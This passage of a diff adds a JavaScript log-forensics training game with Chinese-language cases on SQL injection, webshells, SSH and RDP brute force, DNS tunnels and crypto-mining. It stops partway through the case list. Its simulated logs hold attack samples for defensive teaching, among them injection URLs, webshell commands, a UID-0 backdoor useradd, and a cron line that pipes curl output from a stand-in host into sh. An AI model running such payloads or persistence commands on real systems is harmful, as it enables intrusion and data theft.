@@ -1,0 +1,1159 @@
+/* ============================================================
+   detective.js — 日志侦探取证终端
+   · 24 案 = 8 大日志类别 × 各 3 案（★~★★★）
+   · 工作流：find/ls 定位 → 三剑客(grep/awk/sed)+管道筛查 → check
+   · 每次打开随机一案；题库按类别/星级自选
+   ============================================================ */
+(function () {
+  const $ = s => document.querySelector(s);
+  const esc = s => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+
+  /* ============================================================
+     案情题库：8 类 × 3 案
+     ============================================================ */
+  const CASES = [
+
+  /* ========== ① Web 访问日志 ========== */
+  { id: 'w1', ico: '💉', title: 'Web 日志 · SQL 注入踩点', cat: 'Web 访问日志', diff: 1,
+    brief: '商品页的搜索流量里混进了自动化注入工具的请求。',
+    files: { '/var/log/nginx/access.log': [
+      '10.1.2.5 - - [06/Sep/2026:14:02:11 +0800] "GET /index.html HTTP/1.1" 200 2048 "-" "Mozilla/5.0 Chrome"',
+      '10.1.2.5 - - [06/Sep/2026:14:03:40 +0800] "GET /product.php?id=12 HTTP/1.1" 200 5110 "-" "Mozilla/5.0 Chrome"',
+      '198.51.100.77 - - [06/Sep/2026:14:05:01 +0800] "GET /product.php?id=12%27 HTTP/1.1" 500 320 "-" "Mozilla/5.0"',
+      '198.51.100.77 - - [06/Sep/2026:14:05:04 +0800] "GET /product.php?id=12%20OR%201=1 HTTP/1.1" 200 8890 "-" "Mozilla/5.0"',
+      '198.51.100.77 - - [06/Sep/2026:14:05:09 +0800] "GET /product.php?id=0%20UNION%20SELECT%20user,pass%20FROM%20users HTTP/1.1" 200 12044 "-" "sqlmap/1.7"',
+      '198.51.100.77 - - [06/Sep/2026:14:05:15 +0800] "GET /product.php?id=0%20UNION%20SELECT%20credit_card%20FROM%20users HTTP/1.1" 200 15022 "-" "sqlmap/1.7"',
+      '10.1.2.5 - - [06/Sep/2026:14:06:00 +0800] "GET /about.html HTTP/1.1" 200 1024 "-" "Mozilla/5.0 Chrome"',
+    ]},
+    tasks: [
+      { q: '注入攻击的来源 IP', hint: 'grep -E "OR%201=1|UNION" /var/log/nginx/access.log', ans: ['198.51.100.77'], teach: '💉 注入载荷直接写在 URL 里（%20 是空格、%27 是单引号），按载荷关键词 grep 即可锁定来源。' },
+      { q: '被注入的脚本文件名', hint: '看载荷所在的请求路径', ans: ['product.php'], teach: '📄 注入点=把用户输入直接拼进 SQL 的页面。找到它就找到了要修的洞。' },
+      { q: '攻击者最后试图拖取哪张表（UNION SELECT ... FROM ___）', hint: 'grep "FROM" /var/log/nginx/access.log', ans: ['users'], teach: '🗄️ 攻击者目标明确：users 表里的账号密码和信用卡。参数化查询可根治。' },
+    ],
+    victory: ['结论：198.51.100.77 用 sqlmap 对 product.php?id= 注入，目标 users 表（含 credit_card）。', '整改：该接口改参数化查询 + WAF 拦 UNION/OR 载荷 + 数据库最小权限。'] },
+
+  { id: 'w2', ico: '🕸️', title: 'Web 日志 · Webshell 控制', cat: 'Web 访问日志', diff: 2,
+    brief: '上传目录被人"寄"了个会执行命令的包裹，日志里有它的全部动作。',
+    files: { '/var/log/nginx/access.log': [
+      '10.1.2.5 - - [06/Sep/2026:03:40:10 +0800] "GET /index.html HTTP/1.1" 200 2048 "-" "Mozilla/5.0 Chrome"',
+      '203.0.113.42 - - [06/Sep/2026:03:41:22 +0800] "POST /upload/avatar HTTP/1.1" 200 312 "-" "Mozilla/5.0 Chrome"',
+      '203.0.113.42 - - [06/Sep/2026:03:41:30 +0800] "GET /uploads/shell.php HTTP/1.1" 200 89 "-" "Mozilla/5.0"',
+      '203.0.113.42 - - [06/Sep/2026:03:42:01 +0800] "POST /uploads/shell.php HTTP/1.1" 200 156 "-" "Mozilla/5.0"',
+      '203.0.113.42 - - [06/Sep/2026:03:43:11 +0800] "POST /uploads/shell.php HTTP/1.1" 200 2331 "-" "Mozilla/5.0"',
+      '203.0.113.42 - - [06/Sep/2026:03:44:00 +0800] "POST /uploads/shell.php?pass=cat+/etc/passwd HTTP/1.1" 200 890 "-" "Mozilla/5.0"',
+      '203.0.113.42 - - [06/Sep/2026:03:45:37 +0800] "POST /uploads/shell.php?pass=whoami HTTP/1.1" 200 45 "-" "Mozilla/5.0"',
+      '10.1.2.5 - - [06/Sep/2026:03:46:00 +0800] "GET /products.html HTTP/1.1" 200 4102 "-" "Mozilla/5.0 Chrome"',
+    ]},
+    tasks: [
+      { q: 'Webshell 的文件名（含后缀）', hint: 'grep "uploads" /var/log/nginx/access.log 看反复被 POST 的脚本', ans: ['shell.php'], teach: '🕸️ 上传目录里被反复 POST 的 .php = Webshell。上传功能必须校验文件类型+重命名+隔离目录。' },
+      { q: '一句话木马的连接口令参数名', hint: '看 POST 的问号后面', ans: ['pass'], teach: '🎛️ ?pass= 就是攻击者的"遥控器频道"。对上传目录的带参 POST 告警能直接命中。' },
+      { q: '攻击者执行的第一个系统命令', hint: 'grep "pass=" /var/log/nginx/access.log 看最早那条', ans: ['cat+/etc/passwd', 'cat /etc/passwd', 'cat'], teach: '📜 03:44 先 cat /etc/passwd 摸账号，再 whoami 探权限——标准取证动作，你也可以用同样的思路查它。' },
+    ],
+    victory: ['结论：203.0.113.42 上传 shell.php 后门，经 pass= 参数执行了 cat /etc/passwd、whoami。', '处置：删 Webshell → 修上传校验 → 回溯该 IP 全部历史 → 排查同目录其他可疑文件。'] },
+
+  { id: 'w3', ico: '🕳️', title: 'Web 日志 · 暗链篡改时间线', cat: 'Web 访问日志', diff: 3,
+    brief: '官网首页被植入赌博暗链。从日志里还原：谁、何时、怎么进来的。',
+    files: {
+      '/var/log/nginx/access.log': [
+        '45.33.32.156 - - [06/Sep/2026:03:45:00 +0800] "GET /admin/login HTTP/1.1" 401 192 "-" "Mozilla/5.0"',
+        '45.33.32.156 - - [06/Sep/2026:03:45:20 +0800] "GET /admin/login HTTP/1.1" 401 192 "-" "Mozilla/5.0"',
+        '45.33.32.156 - - [06/Sep/2026:03:46:02 +0800] "GET /admin/login HTTP/1.1" 401 192 "-" "Mozilla/5.0"',
+        '45.33.32.156 - - [06/Sep/2026:03:46:44 +0800] "GET /admin/login HTTP/1.1" 401 192 "-" "Mozilla/5.0"',
+        '45.33.32.156 - - [06/Sep/2026:03:47:10 +0800] "POST /admin/login HTTP/1.1" 200 96 "-" "Mozilla/5.0"',
+        '45.33.32.156 - - [06/Sep/2026:03:47:58 +0800] "POST /admin/page/edit HTTP/1.1" 200 780 "-" "Mozilla/5.0"',
+        '10.1.2.5 - - [06/Sep/2026:03:50:00 +0800] "GET /index.html HTTP/1.1" 200 2048 "-" "Mozilla/5.0 Chrome"',
+      ],
+      '/var/www/html/index.html': [
+        '<!DOCTYPE html><html><head><title>某某公司</title></head><body>',
+        '  <header>某某公司官方网站</header>',
+        '  <main>产品与新闻……</main>',
+        '  <a href="http://u9seo.com/buy" style="display:none">棋牌外链</a>',
+        '</body></html>',
+      ],
+    },
+    tasks: [
+      { q: '攻击者爆破后台成功的时间（时:分:秒）', hint: 'grep 200 /var/log/nginx/access.log 看那条成功的 POST', ans: ['03:47:10', '034710'], teach: '⏱️ 4 次 401 失败后紧跟一条 200 成功——爆破画像的经典收尾。' },
+      { q: '篡改者的来源 IP', hint: '全部 401/200 都来自同一个境外 IP', ans: ['45.33.32.156'], teach: '📌 来源 IP 贯穿爆破→登录→改页面，整条链一个 "人"。' },
+      { q: '被植入的暗链域名', hint: 'cat /var/www/html/index.html 找 display:none 的链接', ans: ['u9seo.com'], teach: '👻 display:none 暗链偷的是你网站的搜索权重。页面完整性监控（哈希基线）能第一时间发现。' },
+    ],
+    victory: ['时间线：03:45 爆破（4×401）→ 03:47:10 登录成功 → 03:47:58 编辑首页植入 u9seo.com 暗链。', '整改：后台强口令+限源+MFA；页面哈希基线监控；暗链清除后向搜索引擎申诉。'] },
+
+  /* ========== ② 系统登录日志 ========== */
+  { id: 'l1', ico: '🔑', title: '系统日志 · SSH 爆破', cat: '系统登录日志', diff: 1,
+    brief: '凌晨的 secure 日志里，有人对 root 进行了一轮暴力破解。',
+    files: { '/var/log/secure': [
+      'Sep  6 03:11:40 web-01 sshd[1901]: Failed password for root from 185.220.101.45 port 44001 ssh2',
+      'Sep  6 03:11:47 web-01 sshd[1901]: Failed password for root from 185.220.101.45 port 44002 ssh2',
+      'Sep  6 03:11:53 web-01 sshd[1901]: Failed password for root from 185.220.101.45 port 44003 ssh2',
+      'Sep  6 03:12:00 web-01 sshd[1901]: Failed password for root from 185.220.101.45 port 44004 ssh2',
+      'Sep  6 03:12:05 web-01 sshd[1901]: Accepted password for root from 185.220.101.45 port 44005 ssh2',
+      'Sep  6 03:12:06 web-01 sshd[1901]: pam_unix(sshd:session): session opened for user root',
+      'Sep  6 06:30:00 web-01 systemd-logind: New session 9 for user deploy.',
+    ]},
+    tasks: [
+      { q: '爆破来源 IP', hint: 'grep Failed /var/log/secure', ans: ['185.220.101.45'], teach: '🔑 同一 IP 高频 Failed password=爆破。统计：grep Failed 后 uniq -c。' },
+      { q: '被爆破成功的账号', hint: 'grep Accepted /var/log/secure', ans: ['root'], teach: '🎯 失败 4 次后 Accepted=密码被试出。root 允许密码登录本身就是大忌。' },
+      { q: '成功登录的时间（时:分:秒）', hint: '看 Accepted 那一行的时间戳', ans: ['03:12:05'], teach: '⏱️ 时间戳是时间线的原子单位，报告里的每一行都要靠它。' },
+    ],
+    victory: ['结论：185.220.101.45 于 03:12:05 爆破 root 成功登入 web-01。', '整改：禁 root 密码登录（改密钥）+ fail2ban + 22 端口限源。'] },
+
+  { id: 'l2', ico: '🛠️', title: '系统日志 · 爆破成功之后', cat: '系统登录日志', diff: 2,
+    brief: 'deploy 账号被爆破成功，攻击者随后的小动作全留在了 history 里。',
+    files: {
+      '/var/log/secure': [
+        'Sep  6 02:00:01 app-01 sshd[2210]: Failed password for deploy from 203.0.113.88 port 51001 ssh2',
+        'Sep  6 02:00:09 app-01 sshd[2210]: Failed password for deploy from 203.0.113.88 port 51002 ssh2',
+        'Sep  6 02:00:30 app-01 sshd[2210]: Accepted password for deploy from 203.0.113.88 port 51005 ssh2',
+        'Sep  6 02:00:31 app-01 sshd[2210]: pam_unix(sshd:session): session opened for user deploy',
+      ],
+      '/home/deploy/.bash_history': [
+        'tail -n 20 /var/log/secure',
+        'sudo useradd -o -u 0 -g 0 backupadm',
+        'passwd backupadm',
+        'crontab -e',
+        'echo "*/3 * * * * curl -s http://203.0.113.88/s|sh" >> /var/spool/cron/root',
+        'history -c',
+      ],
+    },
+    tasks: [
+      { q: '攻击者创建的后门账号名', hint: 'cat /home/deploy/.bash_history 找 useradd', ans: ['backupadm'], teach: '🚪 useradd -o -u 0 = 创建 UID=0 的"第二 root"——最危险的后门账号。' },
+      { q: '持久化用的命令关键词（输 check 命令名）', hint: 'history 里往 root 的 cron 写东西的那条', ans: ['crontab', 'cron'], teach: '⏰ 往 /var/spool/cron/root 写任务=每 3 分钟自动拉起恶意脚本。' },
+      { q: '攻击来源 IP', hint: 'grep Accepted /var/log/secure', ans: ['203.0.113.88'], teach: '📌 来源贯穿登录与 history 里的下载地址——同一攻击者的基础设施。' },
+    ],
+    victory: ['结论：deploy 被爆破后，攻击者创建了 UID=0 后门账号 backupadm 并写入 cron 持久化。', '根除：删账号 → 清 cron → 杀下载链 → 全网比对同 IOC。'] },
+
+  { id: 'l3', ico: '🔐', title: '系统日志 · 隐藏后门账号', cat: '系统登录日志', diff: 3,
+    brief: 'passwd 文件里多了一个陌生名字。它什么时候出生的？谁生的？',
+    files: {
+      '/etc/passwd': [
+        'root:x:0:0:root:/root:/bin/bash',
+        'deploy:x:1000:1000::/home/deploy:/bin/bash',
+        'nginx:x:998:998::/home/nginx:/sbin/nologin',
+        'mysql:x:997:997::/home/mysql:/sbin/nologin',
+        'toor:x:0:0:backup:/home/toor:/bin/bash',
+      ],
+      '/var/log/secure': [
+        'Sep  4 03:12:00 web-01 useradd[4411]: new user: name=toor, UID=0, GID=0, home=/home/toor',
+        'Sep  4 03:12:00 web-01 useradd[4411]: root executed useradd from session (sshd) src=203.0.113.88',
+        'Sep  6 09:00:00 web-01 sshd[5001]: Accepted password for deploy from 10.1.5.7 port 52001 ssh2',
+      ],
+    },
+    tasks: [
+      { q: 'UID=0 的非 root 账号名', hint: 'cat /etc/passwd 找第三列为 0 的行', ans: ['toor'], teach: '🔐 toor=root 倒着拼——经典后门命名。UID=0 即 root 等价权限。' },
+      { q: '该账号的创建日期（月-日）', hint: 'grep useradd /var/log/secure', ans: ['09-04', 'sep 4', '9月4日'], teach: '📅 useradd 日志记下了"出生证明"，时间线定位全靠它。' },
+      { q: '创建该账号时的来源 IP', hint: '看 useradd 那行的 src 字段', ans: ['203.0.113.88'], teach: '📌 创建者当时正从 203.0.113.88 的 SSH 会话操作——与爆破同源。' },
+    ],
+    victory: ['结论：toor 为 09-04 凌晨经 SSH 会话创建的 UID=0 后门账号。', '根除：删账号 → 排查创建来源会话的所有动作 → 全网清点 UID=0。'] },
+
+  /* ========== ③ Windows 事件日志 ========== */
+  { id: 'n1', ico: '💥', title: 'Windows 日志 · RDP 爆破', cat: 'Windows 事件日志', diff: 1,
+    brief: '安全日志导出成 CSV，4625 事件刷了整整一屏。',
+    files: { '/logs/win/security_4625.csv': [
+      'time,event,logon_type,target_user,src',
+      '02:00:11,4625,10,administrator,203.0.113.77',
+      '02:00:22,4625,10,administrator,203.0.113.77',
+      '02:00:33,4625,10,administrator,203.0.113.77',
+      '02:00:44,4625,10,administrator,203.0.113.77',
+      '02:00:55,4625,10,administrator,203.0.113.77',
+      '02:01:06,4624,10,administrator,203.0.113.77',
+      '09:12:00,4624,2,zhangwei,10.1.5.7',
+    ]},
+    tasks: [
+      { q: 'RDP 爆破来源 IP', hint: 'grep 4625 /logs/win/security_4625.csv', ans: ['203.0.113.77'], teach: '💥 4625=登录失败，logon_type 10=远程桌面。同 IP 连续失败即爆破。' },
+      { q: 'Windows"登录失败"事件 ID', hint: '看 CSV 里反复出现的 event 值', ans: ['4625'], teach: '🔢 4624 成功 / 4625 失败 / 4688 进程 / 4720 建号 / 7045 装服务。' },
+      { q: '爆破成功发生在（时:分:秒）', hint: 'grep 4624 看来自同一 IP 的那条', ans: ['02:01:06'], teach: '⏱️ 5 连败后一条 4624 同源成功——爆破转化实锤。' },
+    ],
+    victory: ['结论：203.0.113.77 五次 RDP 爆破后于 02:01:06 成功登录 administrator。', '整改：NLA+锁定策略+3389 限源走堡垒机。'] },
+
+  { id: 'n2', ico: '👤', title: 'Windows 日志 · 凭空多出的账号', cat: 'Windows 事件日志', diff: 2,
+    brief: '事件流里有个账号的"出生记录"和"首次使用记录"挨得很近……',
+    files: { '/logs/win/security_events.csv': [
+      'time,event,detail,src',
+      '03:20:00,4720,"账号创建: name=hacker_x",10.1.2.33',
+      '03:20:01,4732,"hacker_x 加入 administrators 组",10.1.2.33',
+      '03:22:40,4624,"logon_type=3 登录成功: hacker_x",45.83.66.10',
+      '03:23:15,4688,"进程创建: net.exe user",45.83.66.10',
+      '09:00:00,4624,"logon_type=2 登录成功: zhangwei",10.1.5.7',
+    ]},
+    tasks: [
+      { q: '被创建的可疑账号名', hint: 'grep 4720 /logs/win/security_events.csv', ans: ['hacker_x'], teach: '👤 4720=创建账号。创建 1 分钟后就远程登录——不是运维手笔。' },
+      { q: '创建账号的事件 ID', hint: '那条"账号创建"记录的 event 值', ans: ['4720'], teach: '🔢 4732=加入管理组，跟在 4720 后面=直接给了管理员权限。' },
+      { q: '该账号首次登录的来源 IP', hint: 'grep "hacker_x" 看那条 4624', ans: ['45.83.66.10'], teach: '🌍 内网创建、境外登录——账号是给攻击者"远程进门"用的。' },
+    ],
+    victory: ['结论：03:20 由内网 10.1.2.33 创建 hacker_x 并入管理组，2 分钟后境外登录使用。', '处置：禁用账号 → 隔离 10.1.2.33 → 审计其上所有动作。'] },
+
+  { id: 'n3', ico: '🕶️', title: 'Windows 日志 · 域控 DCSync', cat: 'Windows 事件日志', diff: 3,
+    brief: '域控审计里出现了不该出现的"目录复制"。',
+    files: { '/logs/win/dc_audit.csv': [
+      'time,event,account,src_host,src_ip,action',
+      '02:20:00,4662,svc_print,FIN-02,10.1.2.33,Replicating Directory Changes',
+      '02:20:00,4662,svc_print,FIN-02,10.1.2.33,DSReplicationGetChangesAll',
+      '02:20:05,4688,svc_print,FIN-02,10.1.2.33,proc: powershell -enc AQAA',
+      '09:00:00,4624,administrator,DC-01,10.1.5.7,logon_type=3 正常运维',
+    ]},
+    tasks: [
+      { q: '发起 DCSync 的账号', hint: 'grep 4662 /logs/win/dc_audit.csv', ans: ['svc_print'], teach: '🖨️ 打印机服务账号本无复制权限却发起复制——凭据被滥用/被盗的标志。' },
+      { q: '发起主机 IP', hint: '看 src_ip 列', ans: ['10.1.2.33'], teach: '🎯 财务主机向域控要"全域哈希"=DCSync，域内钥匙串被一次掏空。' },
+      { q: 'DCSync 使用的 Windows 事件 ID', hint: '那两行复制的 event 值', ans: ['4662'], teach: '🔢 4662=目录对象访问，配合 Replicating Directory Changes 权限即 DCSync 特征。' },
+    ],
+    victory: ['结论：svc_print 账号自 10.1.2.33 对 DC-01 发起 DCSync，全域凭据面临泄露。', '处置：隔离 FIN-02 → 两次重置 krbtgt → 排查 svc_print 凭据来源。'] },
+
+  /* ========== ④ DNS 日志 ========== */
+  { id: 'd1', ico: '🎭', title: 'DNS 日志 · 仿冒域名', cat: 'DNS 日志', diff: 1,
+    brief: '解析日志里混着几个"长得像大厂"的域名。',
+    files: { '/logs/dns_resolve.log': [
+      '02:00:10 10.1.3.7 paypal.com -> 64.4.250.29 (TTL 300)',
+      '02:00:35 10.1.3.7 paypa1.com -> 45.83.90.12 (TTL 60)',
+      '02:01:10 10.1.2.9 micr0soft-verify.com -> 45.83.90.19 (TTL 60)',
+      '02:01:40 10.1.2.9 appleid-support.net -> 45.83.90.19 (TTL 60)',
+      '02:02:20 10.1.3.7 mail.google.com -> 142.250.71.9 (TTL 300)',
+    ]},
+    tasks: [
+      { q: '仿冒 PayPal 的域名（注意字母）', hint: 'cat /logs/dns_resolve.log', ans: ['paypa1.com'], teach: '🎭 数字 1 冒充字母 l 的 typosquatting，全靠肉眼+搜索引擎比对。' },
+      { q: '解析到 45.83.90.19 的仿冒域名（任答其一）', hint: 'grep "45.83.90.19" /logs/dns_resolve.log', ans: ['micr0soft-verify.com', 'appleid-support.net'], teach: '🔗 多个仿冒域名指向同一 IP=同一攻击者的基础设施，一锅端。' },
+      { q: '查询仿冒域名的内网 IP（micr0soft 那条的来源）', hint: '看 micr0soft 行的第一个字段', ans: ['10.1.2.9'], teach: '🏠 内网机器在查仿冒域名=有同事可能已点击钓鱼链接，值得核一眼。' },
+    ],
+    victory: ['结论：paypa1.com 等 3 个仿冒域名活跃，两个同源 45.83.90.19。', '处置：内网封禁+报备注册商+对查询过它们的内网 IP 做用户提醒。'] },
+
+  { id: 'd2', ico: '🧟', title: 'DNS 日志 · C2 心跳', cat: 'DNS 日志', diff: 2,
+    brief: '有个域名每隔固定时间就被同一台机器查询——规律得不像人。',
+    files: { '/logs/dns_query.log': [
+      '10:00:00 10.1.2.33 A cdn-metrics.top',
+      '10:01:00 10.1.2.33 A cdn-metrics.top',
+      '10:02:00 10.1.2.33 A cdn-metrics.top',
+      '10:03:00 10.1.2.33 A cdn-metrics.top',
+      '10:03:10 10.1.2.5 A www.baidu.com',
+      '10:04:00 10.1.2.33 A cdn-metrics.top',
+      '10:05:00 10.1.2.33 A cdn-metrics.top',
+    ]},
+    tasks: [
+      { q: 'C2 心跳域名', hint: 'grep "10.1.2.33" /logs/dns_query.log 看反复出现的名字', ans: ['cdn-metrics.top'], teach: '🧟 精确 60 秒一次的查询=机器心跳。人上网不会这么规律。' },
+      { q: '发起心跳的内网主机 IP', hint: '看查询来源列', ans: ['10.1.2.33'], teach: '🎯 心跳主机=失陷主机。拿域名反查全网，可能还有同伴。' },
+      { q: '心跳间隔（秒）', hint: '相邻两条的时间差', ans: ['60', '60秒'], teach: '⏱️ 间隔还是木马配置里的"睡眠时间"，情报价值极高。' },
+    ],
+    victory: ['结论：10.1.2.33 每 60 秒心跳一次 cdn-metrics.top，属木马 C2 通信。', '处置：封域名+隔离主机+按心跳特征全网狩猎同类。'] },
+
+  { id: 'd3', ico: '📡', title: 'DNS 日志 · 隧道外传', cat: 'DNS 日志', diff: 3,
+    brief: 'TXT 查询里的子域名长得像乱码——其实那是被切碎的数据。',
+    files: { '/logs/dns_query.log': [
+      '02:00:01 10.1.4.8 TXT aXNvY2QudG9rZW4=.r1.data-t.exfil-cdn.net',
+      '02:00:01 10.1.4.8 TXT cGFzc3dvcmQzNDU=.r2.data-t.exfil-cdn.net',
+      '02:00:02 10.1.4.8 TXT aHJfbWFzdGVy.x9.data-t.exfil-cdn.net',
+      '02:00:02 10.1.4.8 TXT c3FsX2R1bXAuemlw.q3.data-t.exfil-cdn.net',
+      '02:00:05 10.1.4.8 A www.baidu.com',
+    ]},
+    tasks: [
+      { q: '隧道主域名', hint: '看超长子域名共同的结尾', ans: ['exfil-cdn.net'], teach: '🕳️ 数据被 base64 切块塞进子域名逐段寄出。' },
+      { q: '进行隧道通信的内网 IP', hint: '看 TXT 行的来源列', ans: ['10.1.4.8'], teach: '🎯 纯 DNS 通道没有 HTTP 流量——这是它隐蔽的原因。' },
+      { q: '隧道使用的 DNS 记录类型', hint: '每行 A 之前的那个字段', ans: ['TXT', 'txt'], teach: '📡 TXT 可携带 255 字符，是隧道首选。对内网 TXT 查询直接告警。' },
+    ],
+    victory: ['结论：10.1.4.8 经 exfil-cdn.net 的 TXT 隧道分块外传密码与数据库压缩包。', '处置：封域名+隔离主机+DNS 出口收敛。'] },
+
+  /* ========== ⑤ 防火墙/网关日志 ========== */
+  { id: 'f1', ico: '🧭', title: '防火墙日志 · 端口扫描', cat: '防火墙网关日志', diff: 1,
+    brief: 'DROP 记录里藏着一个"敲门狂魔"，看看它在找哪扇门。',
+    files: { '/logs/fw_gateway.log': [
+      '02:10:01 DROP TCP 203.0.113.51:40001 -> 10.1.2.33:22',
+      '02:10:01 DROP TCP 203.0.113.51:40002 -> 10.1.2.33:80',
+      '02:10:02 DROP TCP 203.0.113.51:40003 -> 10.1.2.33:445',
+      '02:10:02 DROP TCP 203.0.113.51:40004 -> 10.1.2.33:3389',
+      '02:10:03 DROP TCP 203.0.113.51:40005 -> 10.1.2.33:445',
+      '02:10:03 DROP TCP 203.0.113.51:40006 -> 10.1.2.33:3306',
+      '02:10:04 DROP TCP 203.0.113.51:40007 -> 10.1.2.33:445',
+      '02:10:04 DROP TCP 203.0.113.51:40008 -> 10.1.2.33:6379',
+      '02:10:05 DROP TCP 203.0.113.51:40009 -> 10.1.2.33:445',
+    ]},
+    tasks: [
+      { q: '扫描来源 IP', hint: 'grep DROP /logs/fw_gateway.log 后看来源列', ans: ['203.0.113.51'], teach: '🧭 全是 DROP=门都关着，但"谁在敲门"要记入观察名单。' },
+      { q: '被敲门次数最多的端口', hint: "grep DROP 后 awk '{print $6}' 再统计", ans: ['445'], teach: '🎯 445(SMB) 被"重点照顾"3 次——它在找永恒之蓝那类门。' },
+      { q: '防火墙对这些包的动作（大写英文）', hint: '每行第一个词', ans: ['drop'], teach: '🛡️ DROP=静默丢弃。日志证明防线有效，按低价值归档观察。' },
+    ],
+    victory: ['结论：203.0.113.51 全端口扫描，重点试探 445。', '处置：封禁来源+保持观察；若出现 ACCEPT 记录则升级应急。'] },
+
+  { id: 'f2', ico: '⛏️', title: '防火墙日志 · 可疑出站', cat: '防火墙网关日志', diff: 2,
+    brief: '出站规则普遍收紧，但有一条 ACCEPT 格外扎眼。',
+    files: { '/logs/fw_gateway.log': [
+      '02:00:01 ACCEPT TCP 10.1.2.40:52000 -> 10.1.1.10:3306 (mysql 业务)',
+      '02:05:00 ACCEPT TCP 10.1.2.33:51322 -> 91.243.72.5:3333',
+      '02:05:01 ACCEPT TCP 10.1.2.33:51323 -> 91.243.72.5:3333',
+      '02:06:00 ACCEPT TCP 10.1.2.33:51330 -> 91.243.72.5:3333',
+      '02:10:00 ACCEPT TCP 10.1.2.5:52100 -> 10.1.1.20:443 (官网 API)',
+    ]},
+    tasks: [
+      { q: '发起可疑出站的内网 IP', hint: 'grep "3333" /logs/fw_gateway.log', ans: ['10.1.2.33'], teach: '🎯 业务服务器连境外 3333（矿池端口）——和挖矿木马的关联一查一个准。' },
+      { q: '目标端口', hint: '那几条 ACCEPT 的目的端口', ans: ['3333'], teach: '🚪 3333/4444/5555 是常见矿池端口，出口封禁是断根手段。' },
+      { q: '这个行为的定性（输 check 两个字）', hint: '高 CPU+矿池端口=?', ans: ['挖矿'], teach: '⛏️ 防火墙日志+主机 CPU 指标交叉，就是挖矿木马的标准定性流程。' },
+    ],
+    victory: ['结论：10.1.2.33 持续外联矿池 91.243.72.5:3333。', '处置：主机清挖矿+出口封矿池段+排查该主机持久化。'] },
+
+  { id: 'f3', ico: '🧊', title: '防火墙日志 · 勒索 C2 与失守主机', cat: '防火墙网关日志', diff: 3,
+    brief: '多条内网主机被拦截的 C2 记录里，混着一条"曾经放行"的旧记录……',
+    files: { '/logs/fw_gateway.log': [
+      '01:40:00 BLOCK TCP 10.1.2.41:50100 -> lockbit-c2.top:443',
+      '01:40:01 BLOCK TCP 10.1.2.55:50200 -> lockbit-c2.top:443',
+      '01:40:02 BLOCK TCP 10.1.2.33:50300 -> lockbit-c2.top:443',
+      '01:40:03 BLOCK TCP 10.1.2.55:50201 -> lockbit-c2.top:443',
+      '01:20:00 ACCEPT TCP 10.1.2.60:50400 -> lockbit-c2.top:443 (旧策略放行)',
+      '01:20:30 ACCEPT TCP 10.1.2.60:50401 -> lockbit-c2.top:443',
+    ]},
+    tasks: [
+      { q: '勒索 C2 的域名', hint: 'cat /logs/fw_gateway.log 找反复出现的域名', ans: ['lockbit-c2.top'], teach: '🧊 多台内网机器同时连一个陌生域名=勒索家族在预热。' },
+      { q: '被放行过（可能已失守）的内网 IP', hint: 'grep ACCEPT /logs/fw_gateway.log', ans: ['10.1.2.60'], teach: '🚨 BLOCK 是好消息，ACCEPT 是坏消息——60 这台机器的 C2 已经通了。' },
+      { q: '被 BLOCK 拦截的主机数量（输 check 数字）', hint: '数一数不同内网 IP', ans: ['3', '三'], teach: '🔢 拿同一 C2 域名反查全网日志，就能数清"已拦/已通"两个名单。' },
+    ],
+    victory: ['结论：lockbit-c2.top 预热通信中；10.1.2.60 被旧策略放行需立即隔离。', '处置：隔离 .60 → 全网封域名 → 核对三台 BLOCK 主机。'] },
+
+  /* ========== ⑥ 数据库日志 ========== */
+  { id: 'q1', ico: '📤', title: '数据库日志 · 拖库', cat: '数据库日志', diff: 1,
+    brief: '通用查询日志里，整张整张的表在深夜被搬空。',
+    files: { '/logs/mysql_general.csv': [
+      'ts,client,query,rows',
+      '02:12:55,"198.51.100.23","SELECT * FROM users WHERE id=1",1',
+      '02:13:01,"198.51.100.23","SELECT * FROM users",120000',
+      '02:13:10,"198.51.100.23","SELECT * FROM orders",860000',
+      '02:13:40,"198.51.100.23","SELECT * FROM payments",310000',
+      '09:00:01,"app@10.1.2.40","SELECT * FROM users WHERE id=88",1',
+    ]},
+    tasks: [
+      { q: '拖库来源 IP', hint: 'grep "SELECT" /logs/mysql_general.csv 看凌晨那批', ans: ['198.51.100.23'], teach: '📤 凌晨+陌生 IP+整表 SELECT（十万行级）=拖库三要素。' },
+      { q: '被搬运行数最多的表', hint: '看 rows 最大那条', ans: ['orders'], teach: '🗄️ orders 86 万行——订单数据黑市硬通货。' },
+      { q: '拖库发生的时间点（时:分）', hint: '看第一条整表 SELECT', ans: ['02:13'], teach: '⏱️ 02:12:55 还在"按 id 查一条"（踩点），02:13:01 开始全表搬——转场只用了 6 秒。' },
+    ],
+    victory: ['结论：198.51.100.23 于 02:13 起拖走 users/orders/payments 共 129 万行。', '整改：应用账号禁全表权限+大结果集告警+敏感字段加密。'] },
+
+  { id: 'q2', ico: '🔑', title: '数据库日志 · 弱口令登录', cat: '数据库日志', diff: 2,
+    brief: '审计日志里 root 的登录来源换成了陌生地址……',
+    files: { '/logs/mysql_audit.csv': [
+      '02:05:00,"root@203.0.113.88","Access denied for user root (using password: YES)"',
+      '02:05:05,"root@203.0.113.88","Access denied for user root (using password: YES)"',
+      '02:05:11,"root@203.0.113.88","Access denied for user root (using password: YES)"',
+      '02:05:18,"root@203.0.113.88","Connection established (password OK)"',
+      '02:05:20,"root@203.0.113.88","QUERY: SHOW DATABASES"',
+      '02:05:26,"root@203.0.113.88","QUERY: SELECT * FROM finance.salary"',
+    ]},
+    tasks: [
+      { q: '被爆破的数据库账号', hint: 'grep "Access denied" /logs/mysql_audit.csv', ans: ['root'], teach: '🔑 数据库 root 也被爆破——数据库往往没有失败锁定策略。' },
+      { q: '爆破来源 IP', hint: '看 client 列', ans: ['203.0.113.88'], teach: '🎯 与 Web 层同一攻击源——多条日志串起来才是完整案情。' },
+      { q: '登录成功后执行的第一条命令', hint: 'grep "password OK" 之后的第一条 QUERY', ans: ['SHOW DATABASES', 'show databases'], teach: '📜 "先看仓库有什么再搬"——和拖库案是同一个攻击者的连贯动作。' },
+    ],
+    victory: ['结论：203.0.113.88 三次爆破后以 root 登入数据库，查库并触及 finance.salary。', '整改：数据库禁 root 远程+失败锁定+审计外发。'] },
+
+  { id: 'q3', ico: '🧪', title: '数据库日志 · INTO OUTFILE 写马', cat: '数据库日志', diff: 3,
+    brief: '有人借数据库的"写文件"能力，往 Web 目录塞了个东西……',
+    files: { '/logs/mysql_audit.csv': [
+      '03:01:00,"root@203.0.113.88","QUERY: SHOW VARIABLES LIKE \'secure_file_priv\'"',
